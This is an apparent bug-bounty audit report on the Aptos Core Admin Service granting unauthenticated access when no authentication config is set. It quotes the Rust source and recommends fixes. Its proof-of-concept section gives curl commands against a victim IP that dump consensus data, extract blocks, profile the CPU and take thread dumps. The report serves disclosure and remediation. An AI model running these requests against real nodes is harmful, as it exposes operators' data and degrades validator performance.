# Audit Report

## Title
Unauthenticated Admin Service Access Allows Information Disclosure and Validator Performance Degradation

## Summary
The Admin Service in Aptos Core automatically authenticates all requests when no authentication configuration is provided, creating a critical security vulnerability on non-mainnet deployments and potential mainnet misconfigurations. When network filtering fails, unauthenticated attackers can access sensitive debugging endpoints that expose consensus state, perform CPU profiling, dump thread information, and extract transaction data.

## Finding Description

The Admin Service implements authentication in `serve_requests()` with a fundamental flaw: if the `authentication_configs` vector is empty, authentication is automatically granted. [1](#0-0) 

The configuration explicitly documents this behavior but treats it as acceptable for non-mainnet chains: [2](#0-1) 

The default configuration leaves `authentication_configs` empty: [3](#0-2) 

On non-mainnet chains, the config optimizer automatically enables the service WITHOUT requiring authentication: [4](#0-3) 

The service binds to all network interfaces by default: [5](#0-4) 

**Attack Path:**

1. **Testnet/Devnet Nodes**: Admin service auto-enabled with empty `authentication_configs`, binds to `0.0.0.0:9102`
2. **Network Misconfiguration**: Docker ports accidentally exposed, cloud security group misconfigured, firewall rule error
3. **Unauthenticated Access**: Attacker sends HTTP requests to port 9102 without any credentials
4. **Automatic Authentication**: Lines 155-156 grant authentication when configs are empty
5. **Sensitive Data Exposure**: Attacker accesses endpoints that leak:
   - Consensus state (last votes, quorum certificates, blocks)
   - Transaction data before public commitment
   - Thread dumps revealing internal execution paths
   - CPU profiling causing performance degradation
   - Mempool parking lot addresses [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under Aptos bug bounty criteria:

1. **Validator Node Slowdowns**: The `/profilez` endpoint allows CPU profiling for configurable durations. Repeated profiling requests degrade validator performance during consensus operations. [7](#0-6) 

2. **Significant Information Disclosure**: 
   - Consensus database dumps expose voting patterns and block metadata
   - Block extraction reveals transactions before public commitment
   - Thread dumps leak internal state and execution patterns
   - This information aids attackers in discovering critical consensus or VM vulnerabilities [8](#0-7) 

3. **Operational Security Impact**: Exposed mempool data and consensus state enables reconnaissance for sophisticated attacks on validator operations.

The vulnerability does NOT directly cause fund theft or consensus safety violations (which would be CRITICAL), but the information disclosure and performance impact meet HIGH severity thresholds.

## Likelihood Explanation

**Likelihood: HIGH for Testnet/Devnet, MEDIUM for Mainnet**

**High Likelihood on Non-Mainnet:**
- Service automatically enabled by default
- Zero authentication required
- Network misconfigurations are extremely common:
  - Docker `--publish` flags exposing ports to 0.0.0.0
  - Kubernetes NodePort services without proper network policies
  - Cloud security groups with overly permissive rules
  - VPN/internal network compromises
- Many operators test configurations on testnet before mainnet deployment

**Medium Likelihood on Mainnet:**
- Service disabled by default
- Config sanitizer enforces authentication requirement [9](#0-8) 

However, bypass paths exist:
- Using `PersistableConfig::load_config()` instead of `NodeConfig::load_from_path()` skips sanitization
- Programmatic config modification after loading
- Config loaded with `skip_config_sanitizer` flag enabled

## Recommendation

**Defense-in-Depth Approach Required:**

1. **Mandatory Authentication**: Require authentication even on non-mainnet chains. Network filtering should be defense layer 2, not layer 1.

```rust
// In crates/aptos-admin-service/src/server/mod.rs, line 155-156
// REMOVE automatic authentication:
if context.config.authentication_configs.is_empty() {
    return Ok(reply_with_status(
        StatusCode::NETWORK_AUTHENTICATION_REQUIRED,
        "Admin service requires authentication configuration. Set authentication_configs in node config."
    ));
}
```

2. **Secure Default Binding**: Change default address from `0.0.0.0` to `127.0.0.1` to prevent external access by default.

```rust
// In config/src/config/admin_service_config.rs, line 45
address: "127.0.0.1".to_string(),  // Changed from "0.0.0.0"
```

3. **Runtime Enforcement**: Add runtime check when service starts to verify authentication is configured if enabled.

```rust
// In crates/aptos-admin-service/src/server/mod.rs, after line 93
if enabled && config.authentication_configs.is_empty() {
    panic!("Cannot enable AdminService without authentication configuration");
}
```

4. **Config Sanitizer Enhancement**: Make sanitizer check apply to all chain types, not just mainnet.

## Proof of Concept

**Exploitation Steps:**

```bash
# 1. Deploy testnet node with default configuration (admin service auto-enabled)
# 2. If port 9102 is exposed to attacker network (misconfiguration):

# Dump consensus database (no authentication required)
curl http://VICTIM_IP:9102/debug/consensus/consensusdb

# Extract all transactions from blocks in BCS format
curl http://VICTIM_IP:9102/debug/consensus/block?bcs=true > blocks.bcs

# Profile CPU for 60 seconds (causes performance degradation)
curl "http://VICTIM_IP:9102/profilez?seconds=60&frequency=99"

# Get thread dump
curl http://VICTIM_IP:9102/threadz

# Get mempool parking lot addresses
curl http://VICTIM_IP:9102/debug/mempool/parking-lot/addresses
```

**Expected Result**: All requests succeed with HTTP 200 and return sensitive data without any authentication.

**Actual Security Behavior**: Requests should fail with HTTP 511 (Network Authentication Required) status.

**Verification Script (Rust)**:

```rust
#[tokio::test]
async fn test_unauthenticated_admin_access() {
    // Start testnet node with default config
    let config = NodeConfig::get_default_validator_config();
    // admin_service.enabled will be auto-set to true for testnet
    // admin_service.authentication_configs will be empty
    
    let client = reqwest::Client::new();
    
    // Attempt unauthenticated access to consensus DB
    let response = client
        .get("http://127.0.0.1:9102/debug/consensus/consensusdb")
        .send()
        .await
        .unwrap();
    
    // VULNERABILITY: Returns 200 OK instead of 511 Authentication Required
    assert_eq!(response.status(), 200);  // This passes, demonstrating the vulnerability
    
    // Should be:
    // assert_eq!(response.status(), 511);
}
```

## Notes

This vulnerability represents a failure of defense-in-depth security principles. While the developers intentionally designed the system to allow unauthenticated access on non-mainnet chains (as evidenced by code comments), this creates an unacceptable attack surface when network filtering fails. The binding to `0.0.0.0` by default exacerbates the issue by accepting connections from all network interfaces rather than localhost only.

The information disclosed through these endpoints—particularly consensus state, transaction data, and performance profiling capabilities—provides attackers with reconnaissance data that could enable discovery of critical vulnerabilities in consensus mechanisms, Move VM execution, or state management systems.

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L71-88)
```rust
    pub fn new(node_config: &NodeConfig) -> Self {
        let config = node_config.admin_service.clone();
        // Fetch the service port and address
        let service_port = config.port;
        let service_address = config.address.clone();

        // Create the admin service socket address
        let address: SocketAddr = (service_address.as_str(), service_port)
            .to_socket_addrs()
            .unwrap_or_else(|_| {
                panic!(
                    "Failed to parse {}:{} as address",
                    service_address, service_port
                )
            })
            .next()
            .unwrap();

```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-174)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L183-243)
```rust
        match (req.method().clone(), req.uri().path()) {
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/profilez") => handle_cpu_profiling_request(req).await,
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/threadz") => handle_thread_dump_request(req).await,
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/stats") => {
                malloc::handle_malloc_stats_request(context.config.malloc_stats_max_len)
            },
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/dump_profile") => malloc::handle_dump_profile_request(),
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/mempool/parking-lot/addresses") => {
                let mempool_client_sender = context.mempool_client_sender.read().clone();
                if let Some(mempool_client_sender) = mempool_client_sender {
                    mempool::mempool_handle_parking_lot_address_request(req, mempool_client_sender)
                        .await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Mempool parking lot is not available.",
                    ))
                }
            },
            _ => Ok(reply_with_status(StatusCode::NOT_FOUND, "Not found.")),
        }
```

**File:** config/src/config/admin_service_config.rs (L21-22)
```rust
    // If empty, will allow all requests without authentication. (Not allowed on mainnet.)
    pub authentication_configs: Vec<AuthenticationConfig>,
```

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```

**File:** config/src/config/admin_service_config.rs (L67-77)
```rust
        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
```

**File:** config/src/config/admin_service_config.rs (L93-103)
```rust
        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L130-156)
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    let mut body = String::new();

    let (last_vote, highest_tc, consensus_blocks, consensus_qcs) =
        consensus_db.consensus_db().get_data()?;

    body.push_str(&format!("Last vote: \n{last_vote:?}\n\n"));
    body.push_str(&format!("Highest tc: \n{highest_tc:?}\n\n"));
    body.push_str("Blocks: \n");
    for block in consensus_blocks {
        body.push_str(&format!(
            "[id: {:?}, author: {:?}, epoch: {}, round: {:02}, parent_id: {:?}, timestamp: {}, payload: {:?}]\n\n",
            block.id(),
            block.author(),
            block.epoch(),
            block.round(),
            block.parent_id(),
            block.timestamp_usecs(),
            block.payload(),
        ));
    }
    body.push_str("QCs: \n");
    for qc in consensus_qcs {
        body.push_str(&format!("{qc:?}\n\n"));
    }
    Ok(body)
}
```
